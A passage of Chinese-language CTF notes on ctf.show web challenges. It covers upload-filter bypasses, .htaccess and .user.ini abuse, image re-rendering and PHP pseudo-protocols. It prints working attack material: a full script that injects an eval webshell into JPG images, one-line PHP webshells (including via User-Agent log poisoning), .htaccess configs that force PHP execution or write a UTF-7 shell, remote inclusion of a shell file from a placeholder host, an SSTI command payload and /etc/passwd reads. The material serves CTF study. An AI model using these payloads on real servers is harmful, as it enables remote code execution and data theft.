           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.webp');
?>
#<?=$_GET[0]($_POST[1]);?>
```

#### jpg图片的二次渲染

也是使用国外大神的脚本

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = '<?=eval($_POST[1]);?>'; 	//写入payload


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

先将你的图片上传至网站，经过一次渲染，再将渲染后的图片经过脚本二次渲染，再上传则可以绕过

使用脚本将你的图片添加payload

```payload
php web165.php picture.jpg
```

### .htaccess详解

`.htaccess`是一个配置文件，用于运行Apache网络服务器软件的网络服务器上。当`.htaccess`文件被放置在一个 "通过Apache Web服务器加载 "的目录中时，`.htaccess`文件会被Apache Web服务器软件检测并执行。这些`.htaccess`文件可以用来改变Apache Web服务器软件的配置，以启用/禁用Apache Web服务器软件所提供的额外功能和特性。(简单来说就是apache中间件有一个文件可以改服务器配置)

`.htaccess`文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 `AllowOverride` 指令来设置。

```
注意：.htaccess 中有 # 单行注释符, 且支持 \拼接上下两行。(注意后面这个东西很重要)
```

**开启.htaccess设置**

默认情况下，Apache HTTP服务器的主配置文件（通常是`httpd.conf`或位于`/etc/apache2/`目录下的`apache2.conf`）中对于`.htaccess`文件的支持是关闭的。这意味着，默认设置下，AllowOverride指令通常被设为`None`，这实际上禁止了`.htaccess`文件的使用。

`.htaccess`文件所在的目录及其所有子目录，若要启动`.htaccess`配置文件，我们需要在服务器的主配置文件将 AllowOverride 设置为 All

```
AllowOverride All  #启动.htaccess文件的使用
```

**.htaccess 的基本语法**

+ 基本语法规则:

	+ 每一行通常代表一条指令，指令名称后跟参数。空白行和以 `#` 开头的行会被当作注释忽略。
	+ 指令名称通常**不区分大小写**，但参数可能区分。
	+ .htaccess 文件位于某个目录时，对该目录及其子目录生效，除非子目录中有自己的 .htaccess 文件覆盖部分配置。

+ 常见指令：

	+ **ErrorDocument**：用来指定自定义错误页面或错误信息
	+ **RewriteEngine、RewriteRule**：用于URL重写和重定向。
	+ **AuthType、AuthUserFile、Require** 等：用于访问控制和目录保护。

+ 条件块：

	+ `<If>`：基于表达式条件判断来有选择地应用内部指令。表达式可以利用逻辑运算、比较、正则表达式匹配（例如 `=~`）等操作。Apache 2.4及以上版本支持这种写法。
	+ `<IfModule>`：只有在指定的模块存在时才应用内部配置。
	+ `<Files>`、`<FilesMatch>`：针对特定文件或文件名模式的配置。
	+ `<Directory>`：用于目录级别配置（不过通常出现在主配置文件中，而非.htaccess）。

+ 表达式语言：

	+ Apache 2.4引入了一套表达式语法，可以在 `<If>` 等条件块中使用。

	+ 支持的运算符包括：

		- **比较运算符**（如 `==`, `!=`, `<`, `>` 等）

		- **逻辑运算符**（如 `&&`, `||`, `!`）

		- **正则表达式匹配运算符**：`=~`（匹配）和 `!~`（不匹配）

			同时支持调用内置函数，比如 `file()` 用于读取文件内容、`req()` 获取请求参数等。

**常见的使用方式**

+ 自定义出错界面

	+ 我们可以使用.htaccess 创建自定义的出错页面。对于Linux Apache来说这是一项极其简单的事情。使用下面的.htaccess语法你可以轻松的完成这一功能。（把.htaccess放在你的网站根目录下）

	+ ```
		ErrorDocument 401 /error/401.php
		ErrorDocument 403 /error/403.php
		ErrorDocument 404 /error/404.php
		ErrorDocument 500 /error/500.php
		```

	+ ```
		<If "file('/flag') =~ '/flag{a/'">
		ErrorDocument 404 "y4tacker"
		</If>
		```

		其中，`file('/flag')`会读取服务器上绝对路径为`/flag`的文件内容；`=~`运算符用于正则表达式匹配，正则匹配flag{a(这个字符爆破的),然后爆破把整个flag爆破出来

+ SetHandler和ForceType

	+ 强制所有匹配的文件被一个指定的处理器处理

	+ ```
		ForceType application/x-httpd-php  #这个配置指令的作用是强制将当前作用域内（例如整个目录或特定文件）的文件视为 PHP 文件。比如一个 .html 文件，如果其中嵌入了 PHP 代码，那么这些代码会被 PHP 解析器执行。
		SetHandler application/x-httpd-php
		```

+ AddHandler

	+ ```
		AddType application/x-httpd-php .htm 则.htm文件也可以执行php程序
		AddHandler cgi-script .yyy 则扩展名为.yyy的文件作为 CGI 脚本来处理
		```

+ AddType

	+ AddType 可以将给定的文件扩展名映射到指定的内容类型

	+ ```
		AddType application/x-httpd-php .xxx 同上AddHandler的作用
		```

+ php_value

	+ 在使用 PHP 作为 Apache 模块时，PHP 的配置可以通过 Apache 的配置文件（比如 httpd.conf）或 .htaccess 文件来修改。这种方式允许你为某个目录或站点指定特定的 PHP 设置，而不必去修改全局的 php.ini 文件。需要有AllowOverride Options 或AllowOverride All 权限才可以。但有个前提是：**只有 PHP_INI_ALL 和 PHP_INI_PERDIR 类型的配置项才能在 .htaccess 中被修改**，而 PHP_INI_SYSTEM 类型的配置项则只能在 php.ini 或 Apache 的全局配置文件（httpd.conf）中设置。

	+ php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag

	+ 而.htaccess 只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令(https://www.php.net/manual/zh/configuration.changes.modes.php)而具体的类型的指令可以参考官方文档https://www.php.net/manual/zh/ini.list.php

	+ 那么在文件上传中可以利用这个实现一句话木马

	+ ```
		php_value auto_prepend_file 1.txt 在主文件解析之前自动解析包含1.txt的内容
		php_value auto_append_file 2.txt 在主文件解析后自动解析1.txt的内容
		```

	+ 还可以用来绕过`preg_match`，我们可以用最大回溯(pcre.backtrack_limit)/递归限制使php正则失效

	+ ```
		php_value pcre.backtrack_limit 0
		```

	+ |         name         |  默认  | 可修改范围  | 更新日志         |
		| :------------------: | :----: | :---------: | ---------------- |
		| pcre.backtrack_limit | 100000 | PHP_INI_ALL | php 5.2.0 起可用 |
		| pcre.recursion_limit | 100000 | PHP_INI_ALL | php 5.2.0 起可用 |
		|       pcre.jit       |   1    | PHP_INI_ALL | php 7.0.0 起可用 |

	+ 设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。

+ php_flag

	+ 用 php_flag设置布尔值，可以将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露

**Vulnerable**

+ **LFI:**

	+ 当前目录下php文件头引入/etc/passwd

	+ ```
		php_value auto_append_file /etc/passwd
		```

	+ 使作用范围内的php文件在文件头/尾自动include指定文件，支持php伪协议，.htaccess可以设置php_value include_path "xxx"将include()的默认路径改变

	+ ```
		php_value include_path "xxx"
		```

+ 远程文件包含

	+ PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启。设置好了以后

	+ ```
		php_value auto_append_file http://xxxxx.xxxx.xxx/shell.txt
		```

+ 可利用的伪协议

	+ 需要`all_url_fopen`、`all_url_include` 为 `On`

	+ ```
		php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
		
		php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
		
		php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.txt"
		```

+ htaccess把自己指定当做 php文件处理

	+ 当前目录下有php文件

	+ ```
		php_value auto_append_file .htaccess
		#<?php phpinfo();
		```

	+ 对于有过滤的情况我们前面说了可以使用`\`号

	+ ```
		php_value auto_prepend_fi\
		le .htaccess
		#<?php phpinfo();
		```

	+ 当前目录下无php文件

	+ 重点：需要先设置允许可访问 .htaccess 文件

	+ ```
		<Files .htaccess>
		//ForceType application/x-httpd-php
		SetHandler application/x-httpd-php
		Require all granted
		php_flag engine on
		</Files>
		php_value auto_prepend_fi\
		le .htaccess
		#<?php phpinfo();
		```

		改成FileMatch指令也行

		```
		<FilesMatch .htaccess>
		//ForceType application/x-httpd-php
		SetHandler application/x-httpd-php
		Require all granted
		php_flag engine on
		</FilesMatch>
		php_value auto_prepend_fi\
		le .htaccess
		#<?php phpinfo();
		
		```

	+ 也可以直接将 .htaccess指定当做 php文件处理

	+ ```
		SetHandler application/x-httpd-php
		# <?php phpinfo(); ?>
		
		```

+ 文件解析配合一句话木马

	+ ```
		<FilesMatch  "shell">
		SetHandler  application/x-httpd-php
		//或ForceType application/x-httpd-php
		</FilesMatch>
		
		```

	+ ```
		AddType application/x-httpd-php .txt
		```

	+ ```
		AddHandler php7-script .txt
		```

+ Cgi执行：

	+ 如果开启了cgi扩展，也可以来解析shell脚本，也就是说cgi_module 需要加载，即 apache 配置文件中有,如 apache2.conf中

	+ ```
		LoadModule cgi_module modules/mod_cgi.so
		```

	+ 在`.htaccess`中

	+ ```
		Options +ExecCGI #允许CGI执行
		AddHandler cgi-script .sh
		```

	+ 然后上传一个cgi（.cgi .pl）脚本里面写shell就可以

	+ ```
		#!/bin/bash
		ls /
		```

+ FastCgi执行

	+ mod_fcgid.so需要被加载。即 apache2.conf中

	+ ```
		LoadModule fcgid_module modules/mod_fcgid.so
		```

	+ 在`.htaccess`中

	+ ```
		Options +ExecCGI
		AddHandler fcgid-script .kk
		FcgidWrapper "/bin/ls /" .kk
		```

	+ 然后上传一个shell.kk脚本就可以执行上面内容了

+ lua执行

	+ ```
		AddHandler lua-script .lua
		```

	+ 再写一个lua脚本

	+ ```lua
		require "string"
		
		function handle(r)
		    r.content_type = "text/plain"
		    local t = io.popen('/readflag')
		    local a = t:read("*all")
		    r:puts(a)
		
		    if r.method == 'GET' then
		        for k, v in pairs( r:parseargs() ) do
		            r:puts( string.format("%s: %s\n", k, v) )
		        end
		    else
		        r:puts("Unsupported HTTP method " .. r.method)
		    end
		end
		```

+ 利用报错写马

	+ 首先写入.htaccess error_log相关的配置

	+ ```
		php_value include_path "/tmp/xx/+ADw?php die(eval($_GET[1]))+ADs +AF8AXw-halt+AF8-compiler()+ADs"
		php_value error_reporting 32767
		php_value error_log /tmp/fl3g.php
		```

	+ `<?php die(eval($_GET[1])); ?>`：一句话木马，`<?php __halt_compiler(); ?>`：调用内置函数 `__halt_compiler()`停止解析php，将 PHP 的错误报告级别设置为 32767（即报告所有错误和警告）。将 PHP 错误日志文件的位置改为 `/tmp/fl3g.php`。

	+ 上面那些神奇字符是utf7编码，可以用下面的方式得到

	+ ```
		<?php
		$filename = "php://filter/write=convert.iconv.utf-8.utf-7/resource=shell"; //utf-16le编码写入文件
		
		file_put_contents($filename, "<?php phpinfo();?>");
		```

		这样转utf-7也行

		```
		mb_convert_encoding('<?php eval($_GET[\'cmd\']); ?>',"utf-7");
		```

	+ Step2 访问index.php留下error_log

	+ Step3 写入.htaccess新的配置

	+ ```
		php_value zend.multibyte 1
		php_value zend.script_encoding "UTF-7"
		php_value include_path "/tmp"
		```

	+ Step4 再访问一次index.php?1=whoami

+ 绕过exif_imagetype()上传.htaccess

	+ 采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度，以像素为单位

	+ ```
		#define width 20
		#define height 10
		xxxxxx
		```

+ \绕过无用字符

	+ 假设在写入文件同时后面默认加上`file_put_contents($filename, $content . "\nhappy")`，我们payload最后可以加上#\，#负责注释

	+ ```
		php_value include_path "/tmp"
		php_value zend.multibyte 1
		php_value zend.script_encoding "UTF-7"
		# \
		happy
		```

	+ \将注释符和脏字符连成一行，注释掉脏字符

### web-151

```text
前端验证，浏览器检查改代码，或者burp拦截抓包改包都行
```

### web-152

```text
Bp抓包修改文件类型即可
```

### web-153

```text
.htaccess在绕过文件上传的限制中，通常在 Apache 全局配置文件 httpd.conf中有这样一条配置：AddType application/x-httpd-php .php .phtml或者SetHandler application/x-httpd-php 将所有文件都解析为 php 文件
这里我们尝试.htaccess（因为它只适用于Apache）所以不行，这里要使用.user.ini

php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；而.user.ini 和.htaccess 一样是目录的配置文件，.user.ini 就是用户自定义的一个 php.ini，通常用这个文件来构造后门和隐藏后门。
```

这道题我们先测试上传过滤，发现php不行，但是其他的都行，所以我们上传一个目录配置文件（这里是nginx代理，所以上传.user.ini）

```text
原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。
```

==auto_append_file在木马文件上传后上传==

==auto_prepend_file在木马文件上传前上传==

根据回显发现他上传的这个目录（/upload）有一个index.php因为我们正常可以打开，通过修改配置文件加上我们上传的php文件，即可拿到shell

```Poc
auto_prepend_file=D.txt
```

### web-154/155

```text
这里先进行图片马上传发现不合规，正常图片(文件)可以上传,则就是文件内容黑名单过滤，经过测试发现是<?php?>被过滤

PHP标签绕过：
　　长标签：<?php  ?>
　　<script language="php">echo '123'; </script>
　　短标签：<?  ?>、<?=   ?>、<%   %>、<%=    %>
　　其中 <?    ?> 需要开启 short_open_tag=On ，<%   %> 需要开启 asp_tags=On
　　或者标签大小写
　　
使用<?php?>短标签绕过
```

### web-156

```text
过滤了文件内容中的php和[]
[]可以用{}绕过
或者直接<?= system('cat ../flag.php');?>
```

### web-157/158

```text
比上一题多过滤了;
但是system函数结尾不加;也能执行
```

### web159

```text
比上一题多过滤了log(防止UA注入)还有()
采用命令执行``
```

### web-160

```text
这题比上一题多过滤了空格
所以我们采用UA注入,log也被过滤了，所以我们采用"."连接
payload:
<?=include"/var/lo"."g/nginx/access.lo"."g/?>
UA:<?php @eval($_POST['yyssh']);?>
```

### web-161

```text
这道题就很sb,它自己前端检测，只能上传png图片，后端检测gif图片的文件头(也就是说这道题连正常上传都是错的)
比上一题多加一个gif文件头就可以了
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

### web-162/163

```text
这里比上一题多过滤了.
```

wp里面有一个错误方法，让我尝试了一半天，现在来说明为什么错误

他的payload是：

```php
GIF89a
<?=$a="Ñ"?>
<?=$b=~$a?>
<?=$l="l"?>
<?=$o="o"?>
<?=$g="g"?>
<?=include"/var/$l$o$g/nginx/access$b$l$o$g"?>
```

想法是.的hex(16进制)值是2e,进行取反后hex值是d1，也就是Ñ，所以实现了.的绕过

但是这个Ñ是一个多字节字符，它进行取反是会按每个字节进行取反，也就是取反后得到<n所以这个wp错误了

但是这个wp给了我一个新的思路，运用.绕过实现UA注入

下面是payload成功拿到webshell

```text
GIF89a
<?=$a="\x2E"?>
<?=$l="l"?>
<?=$o="o"?>
<?=$g="g"?>
<?=include"/var/$l$o$g/nginx/access$a$l$o$g"?>
```

php双引号会解析变量，所以16进制进行解析，所以成功实现.绕过

163多了一个条件竞争，所以在使用burp上传的时候，使用多线程发包，抓包拿到回显

```text
这道题还可以用远程注入和session包含
```

### web-164/165

[图片马的二次渲染](#制作图片马)，web-164是png二次渲染，web-165是jpg的二次渲染，上传成功后直接蚁剑连就可以了

### web-166

右键查看源码，可以看到后缀要求是zip，那就上传一个zip包看一下，成功上传，下载之后发现是`file://`伪协议读取，那就直接写入webshell，蚁剑连接拿到flag

### web-167

二次渲染打一波发现我们图片里面的payload在，但是无法连接蚁剑，说明没有解析图片

## 反序列化

### web-254

```text
纯读代码，钱白花了
```

## XSS

### web-316



## SSTI

### web-361

**题目：**名字就是考点

那就尝试传入post方法的name，回显`The method is not allowed for the requested URL.`错误

尝试传入GET方法的name，发现正常回显，那就直接用payload打

```payload
?name={{config.__class__.__init__.__globals__['os'].popen('cat%20/flag').read()}}
```



## 常用姿势

### web-802

这里我用和命令执行41关一样的脚本

```payload
cmd=("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60");
```

无数字和字母的命令执行方法还有很多，后面会陆续更新

# Web

### web-3

```text
文件包含漏洞:
	1.可以先探测一波文件包含漏洞，他直接将payload include的话，我们尝试写入/etc/passwd
	2.如果有回显的话漏洞存在，没有则无
```

==蚁剑只能连http==

```text
User-Agent 注入一句话木马（以下简称UA）如果有文件包含漏洞，则可以访问它的日志/var/log/nginx/access.log,从而拿到webshell
```

==User-Agent 注入一句话木马==

```html
    GET / HTTP/1.1
    Host: 710d2d68-896d-406b-99b2-4dfa28053fce.challenge.ctf.show
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0<?php @eval($_POST['yyssh']);?> 
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    Priority: u=0, i
    Te: trailers
    Connection: keep-alive
```

#### php伪协议

![php_Protocol](posts/8087d2e8/images/php_Protocol.webp)

##### filter://

```text
php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

resource=<要过滤的数据流>	这个参数是必须的。它指定了你要筛选过滤的数据流。
read=<读链的筛选列表>	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表>	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
<；两个链的筛选列表>	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
```

```e.g.
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php

convert.base64-encode #对index.php进行base64编码加密，进行加密后不再当作php代码执行而是读取他的源码，不进行编码则当作php文件执行

使用的函数是一个过滤器
```

##### filter协议的过滤器

###### 字符串过滤器string

该类通常以string开头，对每个字符都进行同样方式的处理。

```text
该类通常以string开头，对每个字符都进行同样方式的处理。

string.rot13:
一种字符处理方式，字符右移十三位。
php://filter/string.rot13/resource=flag.php //读出以后利用ROT13解码即可

string.toupper:
将所有字符转换为大写
php://filter/string.toupper/resource=flag.php //转大写
    
string.tolower:
将所有字符转换为小写。
php://filter/string.tolower/resource=flag.php //转小写

string.strip_tags:
这个过滤器就比较有意思，用来处理掉读入的所有标签，只有标签会被去除，里面的文字不会删除,例如XML的等等。在绕过死亡exit大有用处。
php://filter/string.strip_tags/resource=flag.php 
```

###### 转换过滤器convert

转换过滤器:
对数据流进行编码，通常用来读取文件源码。

```text
convert.base64-encode & convert.base64-decode:
base64加密解密
php://filter/convert.base64-encode/resource=flag.php //base64加密读出

convert.quoted-printable-encode & convert.quoted-printable-decode:
可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。
php://filter/convert.quoted-printable-encode/resource=flag.php //在后面加了个=0A,其他含义不清楚

```

###### convert.iconv.\*:

它用来对数据进行字符编码转换，具体来说，它利用 `iconv` 库来转换字符编码。

语法与用法：

```text
php://filter/convert.iconv.*:from_charset/to_charset
or
php://filter/convert.iconv.*:from_charset/to_charset
用于指定将数据从一种字符集转换为另一种字符集。这里的 `from_charset` 是原始字符集，`to_charset` 是目标字符集。
```

from_charset和to_charset 就是编码方式，有如下几种：

```text
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE	这个和下面的常用	这两个编码规则其一是要是偶数
UCS-2LE	这个和上面的常用
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
```

示例payload：

```text
?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=/var/www/html/flag.php
```

###### Compression Filters（压缩过滤器)

利用payload：

```text
php://filter/zlib.deflate|zlib.inflate/resource=flag.php        //zlib.deflate（压缩）｜zlib.inflate（解压）
or
php://filter/bzip2.compress|bzip2.decompress/resource=flag.php   //bzip2.compress（压缩）|bzip2.decompress（解压）
```

##### data：//

```text
数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。
#这里的执行是你要是php源码的格式例如:<?php ?>，而不是一个文件

data://text/plain,          #text/plain表示转换的数据为纯文本
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>

data://text/plain;base64,       #逗号后面的base64是把我们编码的url参数进行解码
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

# data://和filter一起妙用，将payload进行两次base64编码 ?url=php://filter/read=convert.base64-decode/resource=data://text/plain;base64,UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr
```

##### file://

```text
用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响
file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)
比如：http://www.xx.com?file=file:///etc/passwd
```

##### php://

```text
在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用
php://作用为访问输入输出流
```

##### php://input

```text
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，
可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。

POST /pikachu/vul/sqli/sqli_id.php HTTP/1.1
Host: 10.202.6.24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://10.202.6.24
Connection: keep-alive
Referer: http://10.202.6.24/pikachu/vul/sqli/sqli_id.php
Cookie: PHPSESSID=khnlbrgptfngdal5cj5v7msvr4（有则加无则不加）
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1&submit=%E6%9F%A5%E8%AF%A2 (POST请求主体)

```

```e.g.
http://127.0.0.1/cmd.php?cmd=php://input
POST数据：<?php phpinfo()?>
注意：
当enctype="multipart/form-data"的时候 php://input` 是无效的
遇到file_get_contents()要想到用php://input绕
```

##### zip://

先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。

由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。

```text
zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。
zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
```

用法：

```text
zip://archive.zip#dir/file.txt
zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]
http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt
```

##### compress.bzip2://

**使用方法：**

```text
compress.bzip2://file.bz2
```

**测试现象：**

```text
http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg
or
http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg
```

##### compress.zlib://

**使用方法：**

```text
compress.zlib://file.gz 
```

**测试现象：**

```text
http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg
or
http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg
```

##### glob://

```text
$files = glob('images/*.{jpg,png,gif}', GLOB_BRACE);
这行代码会返回 images 目录下所有 .jpg、.webp 和 .gif 文件。
作用就是匹配所有符合规则的文件并返回
$files = glob('glob://data/*.txt');
```





#### 利用filter伪协议绕过死亡exit

```text
什么是死亡exit?
死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：
file_put_contents($content, '<?php exit();' . $content);
亦或者
file_put_contents($content, '<?php exit();?>' . $content);
这样，当你插入一句话木马时，文件的内容是这样子的：
<?php exit();?>
<?php @eval($_POST['snakin']);?>
这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。
```

#### base64decode绕过

```text
利用filter协议来绕过，看下这样的代码：
<?php
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);

当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。
